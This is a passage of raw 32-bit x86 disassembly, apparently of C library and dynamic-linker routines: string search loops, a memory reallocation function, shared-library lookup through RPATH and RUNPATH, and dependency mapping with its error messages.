inc edi
jne 0x80771e3
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770d3
xor edi, edx
or edi, 0xfefefeff
inc edi
je 0x8077100
jmp 0x80770e9
add esi, 4
add esi, 4
add esi, 4
cmp dl, cl
jne 0x80771f2
mov eax, esi
test dl, dl
je 0x8077216
cmp dh, cl
jne 0x80771fd
lea eax, [esi + 1]
test dh, dh
je 0x8077216
shr edx, 0x10
cmp dl, cl
jne 0x807720b
lea eax, [esi + 2]
test dl, dl
je 0x8077216
cmp dh, cl
jne 0x8077216
lea eax, [esi + 3]
pop esi
pop edi
ret
push ebp
mov ebp, esp
sub esp, 0x28
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov edx, dword [0x80a9510]
mov esi, dword [arg_8h]
mov ebx, dword [arg_ch]
test edx, edx
je 0x805125e
mov eax, dword [arg_4h]
mov dword [esp], esi
mov dword [var_sp_4h], ebx
mov dword [var_sp_8h], eax
call edx
mov edx, eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
test ebx, ebx
jne 0x8051284
test esi, esi
jne 0x8051278
mov dword [arg_8h], ebx
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov ebx, dword [var_ch]
leave
jmp fcn.08050fe0
mov dword [esp], esi
call fcn.08051180
xor edx, edx
jmp 0x8051251
test esi, esi
je 0x8051266
lea eax, [esi - 8]
mov ecx, dword [eax + 4]
mov dword [var_18h], eax
mov eax, ecx
and eax, 0xfffffff8
cmp ebx, 0xffffffdf
mov dword [var_1ch], eax
ja 0x80513bc
lea eax, [ebx + 0xb]
mov dword [var_14h], 0x10
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovb edx, dword [var_14h]
test cl, 2
mov dword [var_14h], edx
jne 0x805135f
and ecx, 4
mov dword [var_10h], 0x80aa360
je 0x80512df
and dword [var_18h], 0xfff00000
mov eax, dword [var_18h]
mov eax, dword [eax]
mov dword [var_10h], eax
mov eax, 0
test eax, eax
je 0x8051354
mov eax, dword [var_10h]
mov dword [esp], eax
call section.
mov eax, 0
test eax, eax
je 0x805134a
mov eax, dword [var_10h]
mov dword [esp], 0
mov dword [var_sp_4h], eax
call section.
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], esi
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052570
mov edi, eax
mov eax, 0
test eax, eax
je 0x805133f
mov eax, dword [var_10h]
mov dword [esp], eax
call section.
mov edx, edi
jmp 0x8051251
mov eax, dword [var_10h]
mov dword [eax], 0
jmp 0x8051338
mov eax, dword [var_10h]
mov dword [0x80aa34c], eax
jmp 0x805130f
mov eax, dword [var_10h]
mov dword [eax], 1
jmp 0x80512f3
mov eax, dword [var_18h]
call fcn.08050f50
test eax, eax
lea edx, [eax + 8]
jne 0x8051251
mov eax, dword [var_1ch]
mov edx, esi
sub eax, 4
cmp eax, dword [var_14h]
jae 0x8051251
mov dword [esp], ebx
call fcn.08050fe0
xor edx, edx
test eax, eax
mov ebx, eax
je 0x8051251
mov eax, dword [var_1ch]
mov dword [esp], ebx
mov dword [var_sp_4h], esi
sub eax, 8
mov dword [var_sp_8h], eax
call fcn.08053770
mov eax, dword [var_18h]
call fcn.08050f20
mov edx, ebx
jmp 0x8051251
call fcn.08048b20
mov dword [eax], 0xc
jmp 0x8051280
push ebp
mov ebp, esp
push edi
mov edi, edx
push esi
mov esi, ecx
push ebx
sub esp, 0x44c
mov ebx, dword [arg_8h]
mov dword [var_41ch], eax
mov eax, str.DYNAMIC_LINKER_BUG___
test ebx, ebx
cmovne eax, dword [arg_8h]
mov dword [arg_8h], eax
call dword [0x80a9c20]
test edi, edi
mov ebx, dword [eax]
mov eax, 0x80a4f11
cmove edi, eax
test ebx, ebx
je 0x80812d5
mov dword [esp], edi
call fcn.08053400
inc eax
mov dword [var_420h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
mov eax, dword [var_420h]
add eax, esi
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [ebx + 4], eax
je 0x80812c6
mov edx, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edx
mov eax, dword [ebx + 4]
mov dword [esp], eax
call fcn.08053740
mov dword [var_4h], edi
mov edx, dword [var_420h]
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.08053770
mov dword [ebx], eax
mov ecx, dword [var_41ch]
mov eax, 0xffffffff
test ecx, ecx
cmovne eax, dword [var_41ch]
mov dword [var_4h], eax
lea eax, [ebx + 8]
mov dword [esp], eax
call fcn.08084a80
mov dword [ebx], 0x80a4f11
mov dword [ebx + 4], 0x80a467e
jmp 0x80812a3
mov edx, dword [var_41ch]
mov eax, 0x80a4f11
test edx, edx
jne 0x808135b
mov dword [var_20h], eax
mov edx, 0x8092923
mov ecx, 0x80a4f11
mov eax, dword [var_41ch]
test eax, eax
mov eax, edx
cmove eax, ecx
mov dword [var_1ch], eax
mov eax, dword [arg_8h]
mov dword [var_18h], eax
mov eax, str.error_while_loading_shared_libraries
cmp byte [edi], 0
mov dword [var_10h], edi
cmove edx, ecx
test esi, esi
cmovne eax, esi
mov dword [var_14h], edx
mov dword [var_ch], eax
mov eax, dword [0x80a95a8]
mov edx, dword [eax]
mov dword [esp], 2
mov dword [var_4h], str._s:__s:__s_s_s_s_s_n
mov eax, str._program_name_unknown_
test edx, edx
cmovne eax, edx
mov dword [var_8h], eax
call fcn.08081ca0
mov dword [esp], 0x7f
call fcn.08053d90
lea eax, [var_418h]
mov dword [var_8h], 0x400
mov dword [var_4h], eax
mov eax, dword [var_41ch]
mov dword [esp], eax
call fcn.08053300
jmp 0x80812e4
push edi
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov dh, dl
mov ecx, edx
shl edx, 0x10
mov dx, cx
test al, 3
je 0x8076d43
mov cl, byte [eax]
cmp dl, cl
je 0x8076e45
test cl, cl
je 0x8076e1a
inc eax
test al, 3
je 0x8076d43
mov cl, byte [eax]
cmp dl, cl
je 0x8076e45
test cl, cl
je 0x8076e1a
inc eax
test al, 3
je 0x8076d43
mov cl, byte [eax]
cmp dl, cl
je 0x8076e45
test cl, cl
je 0x8076e1a
inc eax
jmp 0x8076d43
lea esi, [esi]
add eax, 0x10
mov ecx, dword [eax]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e27
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e27
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1a
mov ecx, dword [eax + 4]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e24
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e24
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1a
mov ecx, dword [eax + 8]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e21
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e21
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1a
mov ecx, dword [eax + 0xc]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1e
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1e
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
je 0x8076d40
xor eax, eax
pop edi
ret
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x8076e45
cmp cl, dl
je 0x8076e1a
inc eax
test ch, ch
je 0x8076e45
cmp ch, dl
je 0x8076e1a
inc eax
shr ecx, 0x10
test cl, cl
je 0x8076e45
cmp cl, dl
je 0x8076e1a
inc eax
pop edi
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, edx
sub esp, 0x258
mov esi, dword [0x80aac58]
mov dword [var_22ch], ecx
mov dword [var_228h], eax
test esi, esi
je 0x807cff2
test byte [esi + 0x175], 2
jne 0x807cfeb
mov edx, esi
mov eax, ebx
call fcn.08081cd0
test eax, eax
jne 0x807d0c6
test byte [esi + 0x175], 1
je 0x807d62c
mov esi, dword [esi + 0xc]
test esi, esi
jne 0x807cfc4
test byte [0x80aac10], 0x40
jne 0x807d5f0
mov dword [var_4h], 0x2f
mov dword [esp], ebx
call fcn.08076ce0
test eax, eax
je 0x807d1bc
mov eax, dword [var_228h]
test eax, eax
je 0x807d18a
mov edx, dword [var_228h]
mov dword [var_4h], ebx
mov dword [esp], edx
call fcn.0807b0c0
test eax, eax
mov dword [var_220h], eax
jne 0x807d0fb
mov eax, dword [arg_ch]
test eax, eax
je 0x807d0e7
test byte [0x80aac11], 2
jne 0x807d0e7
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
je 0x807d0d2
mov dword [var_8h], esi
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08053770
test eax, eax
je 0x807d0d2
mov edx, dword [var_228h]
mov ecx, dword [arg_8h]
mov dword [esp], edx
mov edx, ebx
call fcn.0807ea00
sub esp, 4
mov esi, eax
test eax, eax
je 0x807d0d2
or byte [eax + 0x175], 2
mov dword [eax + 0x168], 0x80a3618
mov dword [eax + 0x164], 1
or byte [eax + 0x174], 4
mov eax, esi
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret 0xc
xor ecx, ecx
mov edx, ebx
mov eax, 0xc
mov dword [esp], str.cannot_create_shared_object_descriptor
call fcn.08081200
call fcn.08048b20
mov edx, ebx
xor ecx, ecx
mov dword [esp], str.cannot_open_shared_object_file
mov eax, dword [eax]
jmp 0x807d0e2
lea ecx, [var_21ch]
mov dword [esp], eax
mov dword [var_4h], ecx
call fcn.0807c970
mov dword [var_230h], eax
inc eax
je 0x807d16e
mov eax, dword [0x80aac00]
mov ecx, dword [arg_8h]
lea edx, [var_21ch]
mov dword [var_8h], edx
mov dword [esp], ebx
mov dword [var_224h], eax
mov dword [var_14h], ecx
lea eax, [var_224h]
mov dword [var_1ch], eax
mov ecx, dword [var_230h]
mov eax, dword [arg_10h]
mov dword [var_18h], eax
mov dword [var_4h], ecx
mov eax, dword [var_228h]
mov dword [var_10h], eax
mov eax, dword [var_220h]
mov dword [var_ch], eax
call fcn.0807ba00
jmp 0x807d0c8
mov eax, dword [var_220h]
mov dword [esp], eax
call fcn.08051180
cmp dword [var_230h], 0xffffffff
jne 0x807d116
jmp 0x807d045
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
mov dword [esp], esi
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x807d1b5
mov dword [var_8h], esi
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08053770
mov edx, eax
mov eax, edx
jmp 0x807d037
mov dword [esp], ebx
call fcn.08053400
inc eax
test byte [0x80aac10], 1
mov dword [var_234h], eax
jne 0x807d5db
mov eax, dword [var_228h]
mov dword [var_230h], 0xffffffff
test eax, eax
je 0x807d200
mov ecx, dword [var_228h]
mov eax, dword [ecx + 0x8c]
test eax, eax
jne 0x807d2e4
mov esi, dword [var_228h]
test esi, esi
je 0x807d247
lea edi, [esi + 0x180]
mov dword [var_ch], str.RPATH
mov dword [var_8h], 0xf
mov dword [var_4h], edi
mov dword [esp], esi
call fcn.0807b6a0
test al, al
jne 0x807d59c
cmp dword [var_230h], 0xffffffff
mov esi, dword [esi + 0x160]
jne 0x807d247
test esi, esi
jne 0x807d20a
cmp dword [var_230h], 0xffffffff
mov esi, dword [0x80aac58]
je 0x807d274
test byte [0x80aac10], 1
je 0x807d17c
mov dword [esp], 0x809302e
call fcn.08081c40
jmp 0x807d17c
test esi, esi
je 0x807d2d7
movzx eax, byte [esi + 0x174]
and eax, 3
cmp al, 2
je 0x807d2d7
cmp esi, dword [var_228h]
je 0x807d2d7
cmp dword [esi + 0x180], 0xffffffff
je 0x807d2d7
lea eax, [var_220h]
mov ecx, dword [var_22ch]
lea edx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], edx
mov dword [esp], ebx
lea eax, [esi + 0x180]
mov dword [var_ch], eax
mov dword [var_8h], ecx
mov eax, dword [var_234h]
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
cmp dword [var_230h], 0xffffffff
jne 0x807d256
cmp dword [0x80aa9e0], 0xffffffff
je 0x807d32b
lea eax, [var_220h]
mov ecx, dword [var_22ch]
lea edx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], edx
mov dword [var_ch], 0x80aa9e0
mov eax, dword [var_234h]
mov dword [esp], ebx
mov dword [var_8h], ecx
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
cmp dword [var_230h], 0xffffffff
jne 0x807d256
mov eax, dword [var_228h]
test eax, eax
je 0x807d378
mov esi, dword [var_228h]
mov edx, dword [var_228h]
mov dword [var_ch], str.RUNPATH
mov dword [var_8h], 0x1d
add esi, 0x1d0
mov dword [esp], edx
mov dword [var_4h], esi
call fcn.0807b6a0
test al, al
jne 0x807d55d
cmp dword [var_230h], 0xffffffff
jne 0x807d256
mov edi, dword [var_22ch]
test edi, edi
jne 0x807d54a
mov eax, ebx
call fcn.0807d980
test eax, eax
mov dword [var_238h], eax
je 0x807d435
mov ecx, dword [var_228h]
test ecx, ecx
je 0x807d3c5
mov ecx, dword [var_228h]
test byte [ecx + 0x1ed], 8
jne 0x807d4d5
mov edx, dword [var_238h]
test edx, edx
je 0x807d435
mov ecx, dword [var_238h]
lea edx, [var_21ch]
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0807c970
mov dword [var_230h], eax
inc eax
je 0x807d442
mov eax, dword [var_238h]
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
mov dword [esp], esi
call fcn.08050fe0
mov edx, eax
xor eax, eax
test edx, edx
je 0x807d427
mov ecx, dword [var_238h]
mov dword [var_8h], esi
mov dword [esp], edx
mov dword [var_4h], ecx
call fcn.08053770
test eax, eax
mov dword [var_220h], eax
je 0x807d4b8
cmp dword [var_230h], 0xffffffff
jne 0x807d256
mov eax, dword [var_228h]
mov esi, dword [var_228h]
test eax, eax
cmove esi, dword [0x80aac58]
test esi, esi
je 0x807d468
test byte [esi + 0x1ed], 8
jne 0x807d256
cmp dword [0x80aa9f4], 0xffffffff
je 0x807d256
lea eax, [var_220h]
mov ecx, dword [var_22ch]
lea edx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], edx
mov dword [var_ch], 0x80aa9f4
mov eax, dword [var_234h]
mov dword [esp], ebx
mov dword [var_8h], ecx
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
jmp 0x807d256
mov eax, dword [var_230h]
mov dword [esp], eax
call fcn.08053f20
mov dword [var_230h], 0xffffffff
jmp 0x807d435
mov dword [var_23ch], str._lib_
mov dword [var_240h], 0
cld
mov eax, dword [var_240h]
mov esi, dword [var_238h]
mov edi, dword [var_23ch]
mov eax, dword [eax*4 + 0x80a35f4]
mov dword [var_244h], eax
cmp eax, eax
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x807d53b
inc dword [var_240h]
mov eax, dword [var_23ch]
mov edx, dword [var_244h]
cmp dword [var_240h], 1
lea eax, [edx + eax + 1]
mov dword [var_23ch], eax
jbe 0x807d4ea
jmp 0x807d3c5
mov dword [var_238h], 0
jmp 0x807d3c5
mov esi, dword [0x80a95f4]
test esi, esi
jne 0x807d435
jmp 0x807d393
lea eax, [var_220h]
mov edx, dword [var_234h]
lea ecx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], ecx
mov dword [var_ch], esi
mov eax, dword [var_22ch]
mov dword [esp], ebx
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0807cca0
mov dword [var_230h], eax
jmp 0x807d378
lea eax, [var_21ch]
mov ecx, dword [var_22ch]
lea edx, [var_220h]
mov dword [var_14h], eax
mov dword [var_10h], edx
mov dword [var_ch], edi
mov eax, dword [var_234h]
mov dword [esp], ebx
mov dword [var_8h], ecx
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
jmp 0x807d234
mov dword [var_4h], ebx
mov dword [esp], str.find_library_s__searching_n
call fcn.08081c40
jmp 0x807d1d8
mov eax, dword [var_228h]
test eax, eax
je 0x807cfff
mov edx, dword [var_228h]
mov eax, dword [edx + 4]
cmp byte [eax], 0
jne 0x807d613
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], ebx
mov dword [esp], str._nfile_s___needed_by__s_n
call fcn.08081c40
jmp 0x807cfff
mov edx, dword [esi + 0x50]
test edx, edx
je 0x807cfeb
mov eax, dword [esi + 0x2c]
mov edi, dword [edx + 4]
add edi, dword [eax + 4]
mov dword [esp], ebx
mov dword [var_4h], edi
call fcn.08076e50
test eax, eax
jne 0x807cfeb
mov edx, edi
mov eax, esi
call fcn.0807b200
or byte [esi + 0x175], 1
jmp 0x807d0c6
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x94
mov dword [var_48h], ecx
mov dword [var_44h], edx
mov dword [var_40h], eax
mov edx, dword [var_40h]
lea eax, [ecx + ecx*2]
lea eax, [eax*4 + 0x28]
mov ecx, dword [var_40h]
sub esp, eax
lea eax, [var_1fh]
and eax, 0xfffffff0
mov dword [eax + 4], edx
mov dword [var_10h], eax
mov dword [eax], 0
lea edx, [eax + 0xc]
mov dword [var_14h], 1
mov dword [eax + 8], edx
movzx eax, byte [ecx + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [ecx + 0x174], al
mov ebx, dword [var_48h]
mov dword [var_50h], 0
cmp dword [var_50h], ebx
jae 0x8080349
mov edi, dword [var_14h]
mov eax, dword [var_50h]
mov edx, dword [var_44h]
mov ecx, dword [var_10h]
mov esi, dword [edx + eax*4]
lea eax, [edi + edi*2]
inc edi
shl eax, 2
mov dword [var_8ch], edi
lea edx, [eax + ecx + 0xc]
mov dword [ecx + eax], 0
mov dword [var_14h], edi
mov dword [ecx + eax + 4], esi
mov dword [ecx + eax + 8], edx
movzx eax, byte [esi + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [esi + 0x174], al
mov ecx, dword [var_48h]
inc dword [var_50h]
cmp dword [var_50h], ecx
jb 0x80802f9
mov eax, dword [var_14h]
mov esi, dword [var_10h]
lea eax, [eax + eax*2]
lea eax, [esi + eax*4 - 0xc]
mov dword [eax + 8], 0
mov dword [var_4ch], eax
call fcn.08048b20
test esi, esi
mov dword [var_38h], 0
mov ebx, dword [eax]
mov dword [var_58h], 0
mov dword [eax], 0
mov dword [var_54h], ebx
mov ebx, esi
je 0x8080593
mov esi, dword [ebx + 4]
mov dword [var_60h], 0
mov dword [var_64h], 0
mov dword [ebx], 1
mov eax, dword [esi + 0x150]
mov dword [var_5ch], esi
test eax, eax
jne 0x80803e4
mov eax, dword [esi + 0x1d8]
test eax, eax
jne 0x80803e4
mov eax, dword [var_40h]
cmp esi, eax
je 0x80803e4
movzx eax, word [esi + 0x14e]
test ax, ax
je 0x80803e4
movzx eax, ax
lea eax, [eax*4 + 0x12]
and eax, 0xffffc
sub esp, eax
lea edx, [var_1fh]
and edx, 0xfffffff0
mov dword [var_60h], edx
mov ecx, dword [var_5ch]
mov eax, dword [ecx + 0x1c]
test eax, eax
jne 0x8080406
mov eax, dword [ecx + 0xe8]
test eax, eax
jne 0x8080406
mov eax, dword [ecx + 0xe0]
test eax, eax
je 0x80804f4
mov esi, dword [var_5ch]
mov edx, dword [arg_ch]
mov eax, dword [esi + 0x2c]
mov ecx, dword [esi + 8]
mov eax, dword [eax + 4]
mov dword [var_70h], ecx
mov dword [var_6ch], ebx
mov dword [var_2ch], edx
mov dword [var_34h], esi
mov dword [var_68h], eax
mov dword [var_28h], eax
mov eax, dword [arg_8h]
mov dword [var_30h], eax
mov eax, dword [ecx]
test eax, eax
je 0x80804f4
cmp eax, 1
jne 0x8080bc8
mov eax, dword [var_70h]
mov esi, dword [var_68h]
add esi, dword [eax + 4]
mov dword [var_4h], 0x24
mov dword [esp], esi
mov edi, esi
call fcn.08076ce0
test eax, eax
jne 0x8080a97
lea eax, [var_34h]
lea edx, [var_38h]
mov ecx, 0x80801c0
mov dword [esp], eax
mov dword [var_24h], edi
lea eax, [var_3ch]
call fcn.08081410
mov edx, dword [var_38h]
sub esp, 4
test edx, edx
jne 0x8080a80
mov edx, dword [var_20h]
test byte [edx + 0x174], 0x60
jne 0x80804cf
mov ecx, dword [var_4ch]
sub esp, 0x1c
lea eax, [var_1fh_2]
and eax, 0xfffffff0
mov dword [eax], 0
mov dword [eax + 8], 0
mov dword [eax + 4], edx
mov dword [ecx + 8], eax
mov dword [var_4ch], eax
inc dword [var_14h]
movzx eax, byte [edx + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [edx + 0x174], al
mov eax, dword [var_60h]
test eax, eax
je 0x80804e3
mov esi, dword [var_64h]
mov eax, dword [var_60h]
mov dword [eax + esi*4], edx
inc esi
mov dword [var_64h], esi
add dword [var_70h], 8
mov edx, dword [var_70h]
mov eax, dword [edx]
test eax, eax
jne 0x8080437
mov eax, dword [var_60h]
test eax, eax
je 0x8080578
mov ecx, dword [var_64h]
mov esi, dword [var_60h]
mov dword [esi + ecx*4], 0
inc ecx
lea eax, [ecx*8 + 4]
mov dword [var_64h], ecx
mov dword [esp], eax
call fcn.08050fe0
mov edx, eax
mov eax, dword [var_5ch]
test edx, edx
mov dword [eax + 0x1d8], edx
je 0x8080a6e
mov eax, dword [var_64h]
mov esi, dword [var_5ch]
lea edi, [edx + 4]
cld
shl eax, 2
mov dword [edx], esi
mov esi, dword [var_60h]
mov ecx, eax
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov edx, dword [var_5ch]
mov esi, dword [edx + 0x1d8]
lea edi, [esi + eax + 4]
shr eax, 2
mov ecx, eax
xor eax, eax
test eax, eax
rep movsd dword es:[edi], dword ptr [esi]
je 0x808056d
movzx eax, word [esi]
add esi, 2
mov word [edi], ax
add edi, 2
xor eax, eax
test eax, eax
je 0x8080578
movzx eax, byte [esi]
mov byte [edi], al
mov edi, dword [ebx]
test edi, edi
je 0x808058b
mov ebx, dword [ebx + 8]
test ebx, ebx
je 0x8080593
mov esi, dword [ebx]
test esi, esi
jne 0x808057e
test ebx, ebx
jne 0x8080388
call fcn.08048b20
mov ecx, dword [eax]
test ecx, ecx
jne 0x80805aa
mov edx, dword [var_54h]
test edx, edx
je 0x80805aa
mov ebx, dword [var_54h]
mov dword [eax], ebx
mov esi, dword [var_40h]
mov edx, dword [esi + 0x1d8]
test edx, edx
je 0x80805c9
movzx eax, byte [esi + 0x174]
and eax, 3
cmp al, 2
je 0x8080a33
mov eax, dword [var_14h]
lea eax, [eax*8 + 4]
mov dword [esp], eax
call fcn.08050fe0
mov edx, dword [var_40h]
test eax, eax
mov dword [edx + 0x1d8], eax
je 0x8080a2c
mov edx, dword [var_14h]
mov ebx, dword [var_40h]
lea eax, [eax + edx*4 + 4]
mov dword [ebx + 0x154], edx
mov dword [var_14h], 0
mov dword [ebx + 0x150], eax
mov ebx, dword [var_10h]
test ebx, ebx
je 0x8080642
mov eax, dword [arg_8h]
test eax, eax
jne 0x8080a0e
mov esi, dword [ebx + 4]
mov ecx, dword [var_40h]
mov edx, dword [var_14h]
mov eax, dword [ecx + 0x150]
mov dword [eax + edx*4], esi
mov esi, dword [ebx + 4]
inc edx
mov dword [var_14h], edx
and byte [esi + 0x174], 0x9f
mov ebx, dword [ebx + 8]
test ebx, ebx
jne 0x8080610
test byte [0x80aac11], 2
jne 0x8080899
mov edx, dword [var_40h]
mov esi, dword [edx + 0x150]
mov eax, dword [var_40h]
cmp dword [esi], eax
jne 0x8080875
mov edx, dword [var_40h]
mov dword [var_50h], 0
mov edx, dword [edx + 0x1e0]
cmp dword [var_50h], edx
mov dword [var_90h], edx
jae 0x8080867
mov ecx, dword [var_14h]
mov dword [var_8ch], ecx
mov edi, 1
cmp edi, dword [var_8ch]
jae 0x80806b9
mov ebx, dword [var_40h]
mov edx, dword [ebx + 0x1e4]
mov ecx, dword [var_50h]
mov eax, dword [esi + edi*4]
cmp eax, dword [edx + ecx*4]
je 0x808081f
inc edi
cmp edi, dword [var_8ch]
jb 0x80806a1
inc dword [var_50h]
mov ecx, dword [var_90h]
cmp dword [var_50h], ecx
jb 0x808068b
mov ecx, dword [var_8ch]
mov eax, dword [var_40h]
cld
shl ecx, 2
mov edi, dword [eax + 0x1d8]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov dword [var_50h], 1
mov edx, dword [var_14h]
cmp dword [var_50h], edx
mov dword [var_8ch], edx
jae 0x8080811
mov edx, dword [eax + 0x1d8]
mov ecx, dword [var_40h]
mov esi, dword [var_50h]
mov dword [var_80h], 1
mov eax, dword [ecx + 0x150]
mov ebx, dword [eax + esi*4]
cmp dword [edx + 4], ebx
je 0x808072b
lea esi, [esi]
inc dword [var_80h]
mov eax, dword [var_80h]
cmp dword [edx + eax*4], ebx
jne 0x8080720
mov edi, dword [var_80h]
inc edi
cmp edi, dword [var_8ch]
jae 0x808077d
mov ecx, dword [var_80h]
shl ecx, 2
neg ecx
mov dword [var_88h], ecx
mov eax, dword [edx + edi*4]
mov esi, dword [eax + 0x1d8]
test esi, esi
je 0x8080774
mov eax, dword [esi]
test eax, eax
je 0x8080774
mov ecx, dword [var_88h]
lea ecx, [ecx + edi*4]
mov dword [var_84h], ecx
add esi, 4
cmp eax, ebx
je 0x80807c7
mov eax, dword [esi]
test eax, eax
jne 0x8080767
inc edi
cmp edi, dword [var_8ch]
jb 0x8080745
inc dword [var_50h]
mov eax, dword [var_8ch]
cmp dword [var_50h], eax
jb 0x80806fe
mov eax, dword [var_58h]
mov ebx, dword [var_8ch]
test eax, eax
mov dword [edx + ebx*4], 0
jne 0x80807ad
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 8
mov ecx, dword [var_38h]
xor eax, eax
mov edx, dword [var_3ch]
cmp dword [var_58h], 0xffffffff
cmovne eax, dword [var_58h]
mov dword [esp], ecx
xor ecx, ecx
call fcn.08081200
mov eax, dword [var_84h]
mov ecx, dword [var_80h]
mov esi, dword [edx + edi*4]
mov dword [var_8h], eax
lea eax, [edx + ecx*4]
mov dword [var_4h], eax
add eax, 4
mov dword [esp], eax
call fcn.08053690
sub dword [var_88h], 4
mov eax, dword [var_40h]
mov ecx, dword [var_80h]
mov edx, dword [eax + 0x1d8]
mov dword [edx + ecx*4], esi
mov esi, dword [var_14h]
inc ecx
mov dword [var_80h], ecx
mov dword [var_8ch], esi
jmp 0x8080774
mov ecx, dword [var_40h]
mov edx, dword [ecx + 0x1d8]
jmp 0x808078f
mov edi, ecx
dec dword [eax + 0x170]
inc edi
cmp edi, dword [var_90h]
jae 0x8080840
mov eax, dword [edx + edi*4]
mov dword [edx + edi*4 - 4], eax
inc edi
cmp edi, dword [var_90h]
jb 0x8080830
mov eax, dword [var_90h]
dec dword [var_50h]
mov ebx, dword [var_40h]
mov edx, dword [var_14h]
dec eax
mov dword [ebx + 0x1e0], eax
mov dword [var_8ch], edx
mov dword [var_90h], eax
jmp 0x80806b9
mov ebx, dword [var_14h]
mov dword [var_8ch], ebx
jmp 0x80806c7
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x22e
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str.map__l_searchlist.r_list_0___map
call fcn.0805efc0
mov ebx, dword [var_40h]
cmp ebx, dword [0x80aac58]
je 0x80808b2
mov ecx, dword [var_40h]
mov esi, dword [ecx + 0x150]
jmp 0x8080658
mov esi, dword [var_14h]
mov dword [var_50h], 0
cmp dword [var_50h], esi
mov dword [var_8ch], esi
jae 0x8080a00
mov esi, dword [ebx + 0x150]
mov eax, dword [var_50h]
mov ebx, dword [esi + eax*4]
cmp ebx, dword [var_40h]
je 0x8080992
mov eax, dword [ebx + 0x1b8]
test eax, eax
je 0x80808f5
mov edi, dword [eax + 4]
test edi, edi
jne 0x8080992
mov ecx, dword [ebx + 0xe8]
test ecx, ecx
jne 0x80809e6
mov edx, dword [ebx + 0xe0]
test edx, edx
jne 0x80809e6
mov edx, dword [var_40h]
mov eax, dword [edx + 0x1d8]
mov edx, ebx
call fcn.08080230
cmp eax, dword [var_14h]
mov esi, eax
ja 0x80809c2
xor edx, edx
cmp edx, eax
jae 0x808094a
mov ecx, dword [var_40h]
mov eax, dword [ecx + 0x1d8]
mov eax, dword [eax + edx*4]
inc edx
and byte [eax + 0x174], 0x9f
cmp edx, esi
jb 0x8080932
lea eax, [esi*4]
mov dword [var_7ch], eax
add eax, 8
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [ebx + 0x1b8], eax
je 0x80809a9
mov ebx, dword [var_40h]
mov ecx, dword [var_7ch]
lea edi, [eax + 8]
mov dword [eax], edi
mov dword [eax + 4], esi
cld
mov esi, dword [ebx + 0x1d8]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov esi, dword [var_14h]
mov dword [var_8ch], esi
mov esi, dword [ebx + 0x150]
inc dword [var_50h]
mov eax, dword [var_8ch]
cmp dword [var_50h], eax
jb 0x80808d1
jmp 0x8080658
mov ecx, dword [var_40h]
mov edx, dword [ecx + 4]
